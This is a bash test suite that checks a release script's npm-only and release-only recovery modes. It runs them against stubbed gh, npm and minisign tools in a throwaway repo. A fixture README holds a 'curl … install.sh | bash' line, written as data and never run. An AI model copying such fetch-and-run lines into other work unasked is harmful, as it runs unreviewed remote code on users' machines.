#!/usr/bin/env bash
#
# ship-npm-only-after-bump.test.sh — the recovery modes that run AFTER a release is tagged
# (release/ship.sh --npm-only and --release-only) grade the sweep receipt against the TAGGED
# release commit and ship that commit's files — never HEAD's, never the working tree's.
#
#   bash test/ship-npm-only-after-bump.test.sh    (exit 0 = all cases pass)
#
# THE DEFECT. release/ship.sh grades the green FULL sweep receipt BEFORE it bumps (so it grades the
# commit it was asked to ship), then commits `chore(release): vX.Y.Z` — one commit no sweep ever saw —
# and tags it. A later `release/ship.sh --npm-only` (the recovery for a publish that failed, or for a ship
# run with --no-npm) graded the receipt again at HEAD and refused: "receipt graded <the commit before the
# bump> but HEAD is <the bump commit>", with nothing having landed since the ship. The ship had
# invalidated its own authority. Grading HEAD also meant every journal commit after the tag was one more
# thing the receipt had to be walked across.
#
# THE RULE under test. In the post-tag modes the tag v<version> names the release commit T, and T — not
# HEAD — is what is graded and shipped. The receipt covers T when it graded
#   - T itself (a sweep recorded at the bump), or
#   - the commit T was bumped from (T^; only journal/ledger commits — bin/lib/hook-owned-path.sh, the
#     standing rule the ship itself applied — may sit between the graded commit and T^), AND T does
#     nothing but re-pin version files: every changed path is one the bump writes (RELEASE_BUMP_PATHS) or
#     CHANGELOG.md, only in-place edits with the file mode untouched, each file differing from its parent in
#     nothing but version numbers and sha256 digests (CHANGELOG.md only in the release heading), exactly one
#     parent, the subject exactly `chore(release): v<version>`, the manifest version really moved.
# The tag must also name what it is called: T's own manifest says <version>. Commits after the tag are
# irrelevant: journal commits, code commits, an uncommitted edit — none of it is read.
#
# WHAT SHIPS IS T'S BYTES. --npm-only exports packages/ of T with `git archive` into a throwaway directory
# and publishes there, so an uncommitted edit or a later commit under packages/ cannot ship without proof.
# --release-only signs T's install.sh (the bytes the tag serves) and refuses a release-manifest.json that
# describes different ones. The default-command notice reads T's bin/heimdall too. An export that is not
# T's own bytes (an export-ignore or eol rule rewrote a file) is refused, and the export is removed on exit.
# A --release-only run that must CREATE the tag has no T to grade: it needs the receipt to cover HEAD.
#
# THE ARCHIVE. last-full-green.json is the chain anchor, and every later green sweep of main replaces it: a tag that WAS swept green before it was released could no longer be published,
# `--npm-only` died "receipt is STALE for tag ..." the day a sweep of later main landed. test/run-all.sh therefore also files an atomic copy of every green FULL receipt as
# receipts/full-green/<head_sha>.json (the newest 20 are kept), and the post-tag modes try those when the anchor does not cover the tag: each archived receipt gets the checks the anchor
# gets (green, clean, kind full and not aborted, this repo, verify-receipt when it has a cache block, the cold rule of an x.y.0 release) and the same coverage rule (receipt_covers_tag),
# and must be filed under the commit it graded. A bare full ship never reads the archive. Section [10] proves the reader: an archived receipt rescues a tag; a red, other-repo, forged,
# misfiled or older one does not. Section [11] proves the writer: the REAL test/run-all.sh files the copy, never for a red sweep, prunes to 20, and survives a directory it cannot write.
#
# HOW IT IS PROVEN. A throwaway plugin repo carries the REAL release/ship.sh, release/sync-release.sh,
# bin/heimdall-render-version, bin/heimdall-check-identities and bin/lib/hook-owned-path.sh. The REAL full
# ship runs in it (guards, bump, render, sync, commit, push to a local bare origin, fresh-clone R9, tag,
# Release), then the REAL recovery modes run. The only fakes are the four external CLIs first on PATH —
# gh, gitleaks, npm, minisign — so no Release is created, no key is read and nothing can reach a registry:
# the npm stub's `publish` only drops marker files (plus the list of files its directory held), and this
# test refuses to run unless that stub is what `npm` resolves to. `--dry-run` cannot serve as the
# no-publish seam for the receipt: it exits BEFORE the receipt check, so a dry run passes for any receipt.
#
# R6 (checks must be able to fail): the refusals below are the corrupt-and-confirm proofs, and each
# accepted case that matters asserts on what was published against what HEAD would have published — if
# the post-tag modes still read HEAD or the working tree, the content assertions flip.
set -uo pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd "$SELF_DIR/.." && pwd)"
SHIP="$REPO/release/ship.sh"

PASS=0; FAIL=0
ok()  { printf '  \033[32mPASS\033[0m %s\n' "$1"; PASS=$((PASS+1)); }
bad() { printf '  \033[31mFAIL\033[0m %s\n' "$1"; FAIL=$((FAIL+1)); }
tail_of() { tail -n "${2:-15}" "$1" 2>/dev/null | sed 's/^/      | /' >&2; }

if ! command -v jq >/dev/null 2>&1 || ! command -v git >/dev/null 2>&1; then
  echo "FATAL: jq and git are required" >&2; exit 2
fi

WORK="$(mktemp -d "${TMPDIR:-/tmp}/ship-npm-only-bump-test.XXXXXX")"
[ -n "$WORK" ] && [ -d "$WORK" ] || { echo "FATAL: mktemp failed" >&2; exit 2; }
# shellcheck disable=SC2329 # invoked indirectly: the EXIT trap on the next line
cleanup() { rm -rf "$WORK" 2>/dev/null || true; }
trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM

# Nothing in the developer's git/npm configuration may leak into the throwaway repos, and nothing may
# be able to sign, hook or publish.
unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE GIT_COMMON_DIR GIT_PREFIX \
      GIT_AUTHOR_NAME GIT_AUTHOR_EMAIL GIT_COMMITTER_NAME GIT_COMMITTER_EMAIL
export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null
export NPM_CONFIG_USERCONFIG="$WORK/no-npmrc" NPM_CONFIG_GLOBALCONFIG="$WORK/no-npmrc-global"

# ── The four external CLIs, first on PATH ─────────────────────────────────────
STUB="$WORK/stubbin"; mkdir -p "$STUB"
NOOP="$WORK/noop"; printf '#!/usr/bin/env bash\nexit 0\n' > "$NOOP"; chmod +x "$NOOP"
cp "$NOOP" "$STUB/gitleaks"

# gh: records what ship.sh asks GitHub to do and talks to no network.
#   $GH_STUB_STATE/created = "the Release exists";  $GH_STUB_STATE/assets = uploaded asset names, one per line.
cat > "$STUB/gh" <<'GH'
#!/usr/bin/env bash
state="${GH_STUB_STATE:?GH_STUB_STATE unset}"
mkdir -p "$state"
case "${1:-} ${2:-}" in
  "auth status") exit 0 ;;
  "release view")
    [ -f "$state/created" ] || exit 1
    case " $* " in *" --json "*) cat "$state/assets" 2>/dev/null ;; esac
    exit 0 ;;
  "release create") : > "$state/created"; echo "https://github.com/stub/stub/releases/tag/${3:-}"; exit 0 ;;
  "release upload") basename "${4:-}" >> "$state/assets"; exit 0 ;;
  *) exit 0 ;;
esac
GH

# npm: the registry boundary. NOTHING here can publish — `publish` only drops markers in $NPM_STUB_STATE:
#   published-<name>-<version>  `npm view <name>@<version>` then reports that version as live
#   cwd-<name>                  the directory the publish ran in
#   files-<name>                every file that directory held, "<sha256>  <relative path>", sorted — what an
#                               upload of it could carry
# NPM_STUB_FAIL_PUBLISH=1 makes the publish fail (after recording where it ran).
cat > "$STUB/npm" <<'NPM'
#!/usr/bin/env bash
state="${NPM_STUB_STATE:?NPM_STUB_STATE unset}"
mkdir -p "$state"
h() { if command -v sha256sum >/dev/null 2>&1; then sha256sum "$1"; else shasum -a 256 "$1"; fi | awk '{print $1}'; }
args=(); for a in "$@"; do case "$a" in --*) ;; *) args+=("$a") ;; esac; done
case "${args[0]:-}" in
  whoami) echo "tester"; exit 0 ;;
  view)
    spec="${args[1]:-}"
    case "$spec" in
      *@*) ver="${spec##*@}"; name="${spec%@*}"
           [ -f "$state/published-$name-$ver" ] && { echo "$ver"; exit 0; }
           echo "npm ERR! code E404 (stub: $spec is not in the registry)" >&2; exit 1 ;;
      *)   echo "0.0.1"; exit 0 ;;
    esac ;;
  owner) echo "tester <tester@example.com>"; exit 0 ;;
  publish)
    ver="$(jq -r .version ./package.json)"; name="$(jq -r .name ./package.json)"
    pwd -P > "$state/cwd-$name"
    [ -z "${NPM_STUB_FAIL_PUBLISH:-}" ] || { echo "npm ERR! publish failed (stub)" >&2; exit 1; }
    : > "$state/published-$name-$ver"
    find . -type f | LC_ALL=C sort | while IFS= read -r f; do printf '%s  %s\n' "$(h "$f")" "${f#./}"; done > "$state/files-$name"
    echo "+ $name@$ver"; exit 0 ;;
  *) exit 0 ;;
esac
NPM

# minisign: records WHICH bytes ship.sh asked to sign and writes a placeholder signature. No key is read.
#   $MINISIGN_STUB_STATE/signed-sha256 = the sha256 of the file passed to -m
cat > "$STUB/minisign" <<'MINISIGN'
#!/usr/bin/env bash
state="${MINISIGN_STUB_STATE:?MINISIGN_STUB_STATE unset}"
mkdir -p "$state"
msg=""; out=""
while [ "$#" -gt 0 ]; do
  case "$1" in
    -m) msg="${2:-}"; shift ;;
    -x) out="${2:-}"; shift ;;
    -s|-c|-t) shift ;;
  esac
  shift
done
[ -f "$msg" ] && [ -n "$out" ] || { echo "minisign stub: no -m file or no -x output" >&2; exit 2; }
if command -v sha256sum >/dev/null 2>&1; then sha256sum "$msg"; else shasum -a 256 "$msg"; fi | awk '{print $1}' > "$state/signed-sha256"
printf 'stub signature\n' > "$out"
MINISIGN
chmod +x "$STUB/gh" "$STUB/npm" "$STUB/minisign"

for tool in npm minisign; do
  if [ "$(PATH="$STUB:$PATH" command -v "$tool")" != "$STUB/$tool" ]; then
    echo "FATAL: $tool does not resolve to the stub — refusing to run anything that could reach a registry or a signing key" >&2
    exit 2
  fi
done
SIGN_KEY="$WORK/fake-signing.key"; : > "$SIGN_KEY"   # a file for ship.sh's key check; the stub never reads it
FAIL_PUBLISH=""                                      # set to 1 around a run_ship to make the npm stub's publish fail

# The suite-closure engine, for the cases that need ship.sh to ASK it: a receipt with a cache block goes to `bin/heimdall-suite-closure verify-receipt`. This stand-in logs its arguments to
# $HEIMDALL_HOME/closure-stub.log and answers with the verdict in $HEIMDALL_HOME/closure-verdict -- `ok`, or anything else for the refusal the real engine prints for a forged receipt. The engine has
# its own suites (test/suite-closure.test.sh, test/suite-cache-e2e.test.sh); what is proven here is that ship.sh puts an ARCHIVED receipt through it, with that receipt's own path.
ENGINE_STUB="$WORK/closure-stub"
cat > "$ENGINE_STUB" <<'ENGINE'
#!/usr/bin/env bash
home="${HEIMDALL_HOME:?HEIMDALL_HOME unset}"
printf '%s\n' "$*" >> "$home/closure-stub.log"
[ "$(cat "$home/closure-verdict" 2>/dev/null)" = ok ] && exit 0
echo "verify-receipt: suite a.test.sh: closure_sha does not match the closure at the graded commit (forged)" >&2
exit 1
ENGINE
chmod +x "$ENGINE_STUB"

# ── The throwaway plugin repo ─────────────────────────────────────────────────
RAW="https://raw.githubusercontent.com/randomittin/heimdall"
GH_REL="https://github.com/randomittin/heimdall/releases/download"
OLD_VER="9.9.9"; NEW_VER="9.9.10"; NEW_TAG="v$NEW_VER"
ZERO_SHA="$(printf '%064d' 0)"
# A fake bin/heimdall for the default-command notice (npm_default_command_notice): runhmd routes a bare path to `hmd attack`, and ship.sh warns when the tree it publishes for
# does not dispatch that command. --npm-only must look at the TAGGED commit's copy of the file.
# shellcheck disable=SC2016 # fixture text for a fake bin/heimdall: the single-quoted "${1:-}" is literal case-statement source, never an expansion
HMD_BIN_WITH_ATTACK='#!/usr/bin/env bash
case "${1:-}" in
  demo)
    :
    ;;
  prove|attack)
    :
    ;;
esac'
# shellcheck disable=SC2016 # fixture text for a fake bin/heimdall: the single-quoted "${1:-}" is literal case-statement source, never an expansion
HMD_BIN_NO_ATTACK='#!/usr/bin/env bash
case "${1:-}" in
  demo)
    :
    ;;
esac'
# The README's generated-region markers are read from the REAL renderer, never retyped.
MARK_BEGIN="$(sed -n "s/^MARK_BEGIN='\(.*\)'\$/\1/p" "$REPO/bin/heimdall-render-version")"
MARK_END="$(sed -n "s/^MARK_END='\(.*\)'\$/\1/p" "$REPO/bin/heimdall-render-version")"
[ -n "$MARK_BEGIN" ] && [ -n "$MARK_END" ] \
  || { echo "FATAL: could not read the HEIMDALL:VERSION markers out of bin/heimdall-render-version" >&2; exit 2; }

fx_readme() {  # $1=version — the README in its steady state at that version
  # shellcheck disable=SC2016 # literal README text: the backticks around the tag are file content, not command substitutions
  printf '# Fixture plugin\n\n%s\n[![Version](https://img.shields.io/badge/version-%s-00d4ff?style=flat-square)](CHANGELOG.md)\n%s\n\nInstall: curl -fsSL %s/v%s/install.sh | bash <!-- HEIMDALL:PIN:TAG -->\nPinned to the `v%s` tag.\nSignature: %s/v%s/install.sh.minisig\n' \
    "$MARK_BEGIN" "$1" "$MARK_END" "$RAW" "$1" "$1" "$GH_REL" "$1"
}

receipt_json() {  # $1=repo  $2=graded sha — a receipt shaped like the one test/run-all.sh writes
  jq -n --arg repo "$(git -C "$1" rev-parse --show-toplevel)" --arg head "$2" \
    '{finished_at:"2026-10-13T00:00:00Z", repo:$repo, head_sha:$head, tree_clean:true, exit_code:0, kind:"full", suites_total:1, suites_passed:1, suites_failed:0}'
}

write_receipt() {  # $1=repo  $2=graded sha  $3=HEIMDALL_HOME — the chain anchor, last-full-green.json
  mkdir -p "$3/receipts" || return 1
  receipt_json "$1" "$2" > "$3/receipts/last-full-green.json"
}

# write_archive <repo> <graded sha> <HEIMDALL_HOME> [<file name sha> [<jq filter>]] — the receipt of one green sweep as test/run-all.sh files it: receipts/full-green/<graded sha>.json.
# A fourth argument files it under another commit's name, a fifth edits the receipt first (a red one, another repo's, a cache block).
write_archive() {
  local repo="$1" graded="$2" home="$3" name="${4:-$2}" edit="${5:-.}"
  mkdir -p "$home/receipts/full-green" || return 1
  if ! { receipt_json "$repo" "$graded" | jq "$edit" > "$home/receipts/full-green/$name.json" \
         && jq -e . "$home/receipts/full-green/$name.json" >/dev/null 2>&1; }; then
    echo "FATAL: could not write the archived receipt $home/receipts/full-green/$name.json (filter: $edit)" >&2; exit 2
  fi
}

# make_fixture <dir> <journal-before-ship 0|1> [<bin/heimdall that dispatches attack 1|0>] — a plugin repo at the steady state of version 9.9.9, ready to ship.
# History: initial -> a real code change (the commit the receipt grades) [-> a journal commit]. Sets FX_C0, FX_RECEIPT_SHA.
make_fixture() {
  local d="$1" jb="${2:-0}" hb="${3:-1}" p
  mkdir -p "$d/release" "$d/bin/lib" "$d/.claude-plugin" "$d/packages/runheimdall" "$d/packages/runhmd" || return 1
  cp "$SHIP" "$d/release/ship.sh" \
    && cp "$REPO/release/sync-release.sh" "$d/release/sync-release.sh" \
    && cp "$REPO/bin/heimdall-render-version" "$d/bin/heimdall-render-version" \
    && cp "$REPO/bin/heimdall-check-identities" "$d/bin/heimdall-check-identities" \
    && cp "$REPO/bin/lib/hook-owned-path.sh" "$d/bin/lib/hook-owned-path.sh" || return 1
  printf '#!/usr/bin/env bash\necho "- a real changelog line"\n' > "$d/bin/generate-changelog"
  chmod +x "$d/release/ship.sh" "$d/release/sync-release.sh" "$d/bin/heimdall-render-version" \
           "$d/bin/heimdall-check-identities" "$d/bin/generate-changelog" || return 1
  # Every rendered file is written the way the real writers leave it (jq-formatted JSON, 302 redirects,
  # permanent:false) so the bump changes ONLY version pins — the steady state of the real repo.
  jq -n --arg v "$OLD_VER" '{name:"heimdall", version:$v}' > "$d/.claude-plugin/plugin.json"
  printf '%s\n' "$OLD_VER" > "$d/VERSION"
  fx_readme "$OLD_VER" > "$d/README.md"
  cp "$d/README.md" "$d/packages/runheimdall/README.md"
  # shellcheck disable=SC2016 # literal installer text: "$DEFAULT_REF" is file content for the fixture's install.sh, not an expansion here
  printf '#!/usr/bin/env bash\ninstall() {\n  local DEFAULT_REF="v%s"\n  echo "$DEFAULT_REF"\n}\n' "$OLD_VER" > "$d/install.sh"
  jq -n --arg url "$RAW/v$OLD_VER/install.sh" '{redirects:[{source:"/install", destination:$url, permanent:false}]}' > "$d/vercel.json"
  printf '/install  %s/v%s/install.sh  302\n' "$RAW" "$OLD_VER" > "$d/_redirects"
  for p in runheimdall runhmd; do
    jq -n --arg name "$p" --arg v "$OLD_VER" --arg tag "v$OLD_VER" --arg url "$RAW/v$OLD_VER/install.sh" --arg sha "$ZERO_SHA" \
      '{name:$name, version:$v, description:"Nothing ships unproven.", files:["README.md"], heimdall:{tag:$tag, installScriptUrl:$url, sha256:$sha}}' \
      > "$d/packages/$p/package.json"
  done
  # runhmd routes a bare path to `hmd attack`; --npm-only checks the TAGGED commit's bin/heimdall for that command before it publishes.
  jq '.heimdall.defaultCommand = "attack"' "$d/packages/runhmd/package.json" > "$d/packages/runhmd/package.json.new" \
    && mv "$d/packages/runhmd/package.json.new" "$d/packages/runhmd/package.json" || return 1
  if [ "$hb" = "1" ]; then
    printf '%s\n' "$HMD_BIN_WITH_ATTACK" > "$d/bin/heimdall" && chmod +x "$d/bin/heimdall" || return 1
  fi
  printf '# Changelog\n\n## [Unreleased]\n\n### Changed\n- a fixture entry\n\n## [%s] - 2026-01-01\n\n- first\n' "$OLD_VER" > "$d/CHANGELOG.md"
  printf '.heimdall/\n' > "$d/.gitignore"
  git init -q "$d" \
    && git -C "$d" config user.email "rj@runheimdall.dev" && git -C "$d" config user.name "RJ" \
    && git -C "$d" config commit.gpgsign false || return 1
  git -C "$d" add -A && git -C "$d" commit -q -m "chore: initial fixture" && git -C "$d" branch -M main || return 1
  FX_C0="$(git -C "$d" rev-parse HEAD)"
  # The previous release is tagged, as in the real repo: release notes are ranged from it.
  git -C "$d" tag "v$OLD_VER" "$FX_C0" || return 1
  printf '#!/usr/bin/env bash\necho feature\n' > "$d/bin/feature.sh"
  git -C "$d" add -A && git -C "$d" commit -q -m "feat: a real change" || return 1
  FX_RECEIPT_SHA="$(git -C "$d" rev-parse HEAD)"
  write_receipt "$d" "$FX_RECEIPT_SHA" "$d.home" || return 1
  if [ "$jb" = "1" ]; then   # a hook-owned commit between the graded commit and the ship
    mkdir -p "$d/.planning/journal" || return 1
    printf 'a journal entry\n' > "$d/.planning/journal/2026-10-13-haid_fixture.md"
    git -C "$d" add -A && git -C "$d" commit -q -m "journal: [COMMUNICATION] fixture entry" || return 1
  fi
  # The bare origin's HEAD must name main, or R9's fresh clone has nothing to check out.
  git init -q --bare "$d.git" && git -C "$d.git" symbolic-ref HEAD refs/heads/main \
    && git -C "$d" remote add origin "$d.git" && git -C "$d" push -q -u origin main \
    && git -C "$d" push -q origin "refs/tags/v$OLD_VER" || return 1
}

# run_ship <repo> <ship.sh args...> — output lands in "<repo>.out". The paths a run could use to reach
# outside the sandbox (the marketing-site checkout sync-release pushes to, the minisign key, the landmine
# linter, the temp directory) are pinned inside it; "<repo>.tmp" is that run's TMPDIR, so a leftover shows.
run_ship() {
  local d="$1"; shift
  rm -rf "$d.gh" "$d.npm" "$d.sign" "$d.tmp"; mkdir -p "$d.tmp"
  ( cd "$d" || exit 99
    PATH="$STUB:$PATH" HEIMDALL_HOME="$d.home" HEIMDALL_SITE_DIR="$WORK/no-site" \
    HEIMDALL_SIGNING_KEY="$SIGN_KEY" SHIP_LANDMINE_LINT="$NOOP" TMPDIR="$d.tmp" \
    GH_STUB_STATE="$d.gh" NPM_STUB_STATE="$d.npm" MINISIGN_STUB_STATE="$d.sign" \
    NPM_STUB_FAIL_PUBLISH="$FAIL_PUBLISH" bash release/ship.sh "$@" ) >"$d.out" 2>&1
}

published_count() { local n=0 f; for f in "$1".npm/published-*; do [ -e "$f" ] && n=$((n+1)); done; echo "$n"; }

sha256_stdin() { if command -v sha256sum >/dev/null 2>&1; then sha256sum | awk '{print $1}'; else shasum -a 256 | awk '{print $1}'; fi; }

# files_of <repo> <commit> <package> — "<sha256>  <path inside the package>" for every file <commit> holds under
# packages/<package>, sorted: exactly what a publish of that package at that commit carries.
files_of() {
  local d="$1" c="$2" pkg="$3" p
  git -C "$d" ls-tree -r --name-only "$c" -- "packages/$pkg" | LC_ALL=C sort | while IFS= read -r p; do
    printf '%s  %s\n' "$(git -C "$d" show "$c:$p" | sha256_stdin)" "${p#packages/"$pkg"/}"
  done
}

tag_commit() { git -C "$1" rev-parse "refs/tags/$NEW_TAG^{commit}"; }   # <repo> — the commit the release tag names

# variant <name> [<fixture dir> <the commit its receipt graded>] — sets V to a private copy of the released BASE fixture (or of the other released fixture named), its receipt re-pointed at the copy's own path.
# Its origin points nowhere: `git fetch origin` would otherwise re-fetch a tag a case deliberately deleted.
variant() {
  local from="${2:-$BASE}" graded="${3:-$BASE_RECEIPT_SHA}"
  V="$WORK/v-$1"
  if ! { cp -R "$from" "$V" && cp -R "$from.home" "$V.home" \
         && git -C "$V" remote set-url origin "$V.nowhere.git" \
         && write_receipt "$V" "$graded" "$V.home"; }; then
    echo "FATAL: could not copy the base fixture to $V" >&2; exit 2
  fi
}

commit_all() {
  if ! { git -C "$1" add -A && git -C "$1" commit -q -m "$2"; }; then echo "FATAL: commit failed in $1" >&2; exit 2; fi
}

# commit_paths <repo> <message> <path...> — commit exactly those paths, as the journal hook does.
commit_paths() {
  local d="$1" msg="$2"; shift 2
  if ! { git -C "$d" add -- "$@" && git -C "$d" commit -q -m "$msg"; }; then echo "FATAL: commit failed in $d" >&2; exit 2; fi
}

# amend_bump <repo> <git commit --amend args...> — rewrite the release commit (changes already in the index)
# and re-point the release tag at the amended commit.
amend_bump() {
  local d="$1"; shift
  if ! { git -C "$d" commit -q --amend "$@" >/dev/null 2>&1 && git -C "$d" tag -f "$NEW_TAG" >/dev/null 2>&1; }; then
    echo "FATAL: could not amend the bump commit in $d" >&2; exit 2
  fi
}

# moved_on <repo> — the anchor moves on, as it does the next time main is swept: a commit lands after the release (it changes a published file too, so HEAD is not what the tag ships) and
# last-full-green.json now names it. With no archive the tag is no longer covered -- see "receipt graded a commit past the tag" in [5].
moved_on() {
  printf 'echo later\n' > "$1/bin/later-fix.sh"
  printf 'a later change\n' >> "$1/packages/runheimdall/README.md"
  commit_all "$1" "fix: landed after the release"
  write_receipt "$1" "$(git -C "$1" rev-parse HEAD)" "$1.home"
}

# install_engine <repo> -- put the engine stand-in in the fixture's bin/. It is untracked, so install it after the last commit of the case (commit_all would carry it into history).
install_engine() {
  if ! { cp "$ENGINE_STUB" "$1/bin/heimdall-suite-closure" && chmod +x "$1/bin/heimdall-suite-closure"; }; then
    echo "FATAL: could not install the engine stand-in in $1" >&2; exit 2
  fi
}

# x_y_0 <repo> -- retag the released bump as a minor release: its manifest and its title say 9.10.0 and the tag moves, so the cold-receipt rule of an x.y.0 release applies. Only plugin.json changes
# (the other files keep the patch number; they still differ from the parent in version numbers alone, which is all the bump's shape rule reads).
x_y_0() {
  local d="$1"
  if ! { jq '.version = "9.10.0"' "$d/.claude-plugin/plugin.json" > "$d/plugin.json.new" && mv "$d/plugin.json.new" "$d/.claude-plugin/plugin.json" \
         && git -C "$d" commit -q -a --amend -m "chore(release): v9.10.0" \
         && git -C "$d" tag -d "$NEW_TAG" >/dev/null && git -C "$d" tag v9.10.0; }; then
    echo "FATAL: could not retag the bump in $d as 9.10.0" >&2; exit 2
  fi
}

expect_accepted() {  # <label> <repo> <ship flag> <success banner> <receipt line the run must print>
  local label="$1" d="$2" flag="$3" banner="$4" line="$5" rc
  run_ship "$d" "$flag"; rc=$?
  if [ "$rc" -eq 0 ] && grep -Fq -- "$line" "$d.out" && grep -Fq -- "$banner" "$d.out"; then
    ok "$label: $flag accepts the receipt and runs to its end (rc=0)"
  else
    bad "$label: $flag should accept the receipt (rc=$rc; wanted '$line' and '$banner')"; tail_of "$d.out" 18
  fi
  if [ "$flag" = "--npm-only" ]; then
    if [ "$(published_count "$d")" -eq 2 ]; then
      ok "$label: both wrappers reached the stubbed registry boundary"
    else
      bad "$label: expected 2 publishes at the npm stub, saw $(published_count "$d")"
    fi
  fi
}

nothing_published() {  # <label> <repo> <ship flag>
  local label="$1" d="$2" flag="$3"
  if [ "$flag" = "--npm-only" ]; then
    if [ "$(published_count "$d")" -eq 0 ]; then ok "$label: a refused run published nothing"; else bad "$label: a refused run still reached npm publish ($(published_count "$d") times)"; fi
  else
    if [ ! -e "$d.gh/created" ]; then ok "$label: a refused run created no Release"; else bad "$label: a refused run still created the Release"; fi
  fi
}

expect_refused() {  # <label> <repo> <ship flag> <text the refusal must contain>...
  local label="$1" d="$2" flag="$3" want rc
  shift 3
  run_ship "$d" "$flag"; rc=$?
  if [ "$rc" -ne 0 ]; then
    ok "$label: $flag REFUSES (rc=$rc)"
  else
    bad "$label: $flag should refuse"; tail_of "$d.out" 12
  fi
  for want in "$@"; do
    if grep -Fq -- "$want" "$d.out"; then
      ok "$label: the refusal says '$want'"
    else
      bad "$label: the refusal does not say '$want'"; tail_of "$d.out" 8
    fi
  done
  nothing_published "$label" "$d" "$flag"
}

# published_equals <label> <repo> <commit> — what each wrapper's publish saw is exactly what <commit> holds under packages/<name>/
published_equals() {
  local label="$1" d="$2" c="$3" pkg
  for pkg in runheimdall runhmd; do
    if [ -f "$d.npm/files-$pkg" ] && [ "$(cat "$d.npm/files-$pkg")" = "$(files_of "$d" "$c" "$pkg")" ]; then
      ok "$label: the $pkg publish carried exactly the files of ${c:0:12}"
    else
      bad "$label: the $pkg publish did NOT carry exactly the files of ${c:0:12}"
      diff <(files_of "$d" "$c" "$pkg") "$d.npm/files-$pkg" 2>&1 | sed 's/^/      | /' >&2
    fi
  done
}

# published_from_a_throwaway_dir <label> <repo> — the publish ran outside the working tree, and nothing is left behind
published_from_a_throwaway_dir() {
  local label="$1" d="$2" top cwd
  top="$(cd "$d" && pwd -P)"
  cwd="$(cat "$d.npm/cwd-runheimdall" 2>/dev/null || true)"
  case "$cwd" in
    "")      bad "$label: the npm stub recorded no publish directory" ;;
    "$top"/*) bad "$label: the publish ran INSIDE the working tree ($cwd)" ;;
    *)       if [ -e "$cwd" ]; then bad "$label: the publish directory $cwd was left behind"; else ok "$label: the publish ran in a directory outside the working tree, and it is gone"; fi ;;
  esac
  if [ -z "$(ls -A "$d.tmp" 2>/dev/null)" ]; then ok "$label: the run left nothing in its temp directory"; else bad "$label: the run left files in its temp directory"; ls -A "$d.tmp" >&2; fi
}

# signed_install_is <label> <repo> <commit> — the bytes ship.sh asked minisign to sign are <commit>'s install.sh
signed_install_is() {
  local label="$1" d="$2" c="$3" want
  want="$(git -C "$d" show "$c:install.sh" | sha256_stdin)"
  if [ "$(cat "$d.sign/signed-sha256" 2>/dev/null)" = "$want" ]; then
    ok "$label: the signature covers the install.sh of ${c:0:12}"
  else
    bad "$label: the signed bytes are not the install.sh of ${c:0:12} (signed '$(cat "$d.sign/signed-sha256" 2>/dev/null)', wanted $want)"
  fi
}

echo "ship-npm-only-after-bump harness  ship=$SHIP"
echo "--------------------------------------------------------------------"

# ── [1] The REAL full ship, in a throwaway repo ───────────────────────────────
echo "[1] the real full ship"
BASE="$WORK/base"
make_fixture "$BASE" 0 || { echo "FATAL: could not build the fixture repo" >&2; exit 2; }
BASE_C0="$FX_C0"; BASE_RECEIPT_SHA="$FX_RECEIPT_SHA"
run_ship "$BASE" --no-npm; rc=$?
if [ "$rc" -eq 0 ] && grep -Fq 'Shipped & verified' "$BASE.out" && grep -Fq "Released $NEW_TAG" "$BASE.out"; then
  ok "full ship: exits 0 — guards, bump, push, fresh-clone R9, tag and Release all ran"
else
  bad "full ship: did not complete (rc=$rc) — the harness cannot stand in for a real ship"; tail_of "$BASE.out" 25
  echo ""; echo "ship-npm-only-after-bump.test.sh: $PASS passed, $FAIL failed."; exit 1
fi
BUMP="$(git -C "$BASE" rev-parse HEAD)"
if [ "$(git -C "$BASE" log -1 --format=%s)" = "chore(release): $NEW_TAG" ] \
   && [ "$(tag_commit "$BASE")" = "$BUMP" ] \
   && [ "$(git -C "$BASE" rev-parse HEAD^)" = "$BASE_RECEIPT_SHA" ]; then
  ok "full ship: HEAD is the tagged chore(release) commit, directly on the commit the receipt graded"
else
  bad "full ship: HEAD is not the tagged chore(release) commit on the graded commit"; git -C "$BASE" log --oneline -4 >&2
fi
if [ -z "$(git -C "$BASE" status --porcelain)" ]; then
  ok "full ship: leaves the working tree clean — everything the bump rewrote is in the release commit"
else
  bad "full ship: left uncommitted changes behind (the fixture would not model a real ship)"; git -C "$BASE" status --short >&2
fi
# The exemption's path allowlist must be EXACTLY what the real bump writes: too narrow and every real ship
# is refused, too wide and unproven files ride in. The bump here is the real one, so this pins the two together.
# shellcheck disable=SC1090 # $SHIP is the file under test; the SHIP_SOURCE_ONLY seam defines its functions and runs nothing
ALLOW="$( cd "$REPO" && SHIP_SOURCE_ONLY=1 . "$SHIP" >/dev/null 2>&1 && printf '%s\n' "${RELEASE_BUMP_PATHS:-}" )"
CHANGED="$(git -C "$BASE" diff --name-only --no-renames HEAD^ HEAD | sort)"
if [ -n "$ALLOW" ] && [ "$CHANGED" = "$(printf '%s\n' "$ALLOW" | sort)" ]; then
  ok "full ship: the files the real bump changed are exactly ship.sh's RELEASE_BUMP_PATHS"
else
  bad "full ship: the real bump's changed files differ from RELEASE_BUMP_PATHS"
  printf '      changed by the bump:\n%s\n      RELEASE_BUMP_PATHS:\n%s\n' "$(printf '%s\n' "$CHANGED" | sed 's/^/        /')" "$(printf '%s\n' "$ALLOW" | sort | sed 's/^/        /')" >&2
fi

# ── [2] The operator's scenario: --npm-only right after the full ship, nothing landed in between ──
echo "[2] --npm-only after a full ship"
expect_accepted "nothing landed" "$BASE" --npm-only "npm reconciled to $NEW_VER" \
  "green FULL sweep receipt covers tag $NEW_TAG (${BUMP:0:12}): it graded the commit the tag was bumped from (${BASE_RECEIPT_SHA:0:12})"
published_equals "nothing landed" "$BASE" "$BUMP"
published_from_a_throwaway_dir "nothing landed" "$BASE"
if grep -Fq "exported packages of tag $NEW_TAG (${BUMP:0:12})" "$BASE.out"; then
  ok "nothing landed: the run says it published the tag's export, not the working tree"
else
  bad "nothing landed: the run does not say it exported the tag's packages"; tail_of "$BASE.out" 12
fi
if grep -Fq "dispatches no 'attack' subcommand" "$BASE.out"; then
  bad "nothing landed: the default-command notice fired although the tagged commit's bin/heimdall dispatches attack"; tail_of "$BASE.out" 12
else
  ok "nothing landed: no default-command notice — the tagged commit's own bin/heimdall dispatches attack"
fi
run_ship "$BASE" --npm-only --dry-run; rc=$?
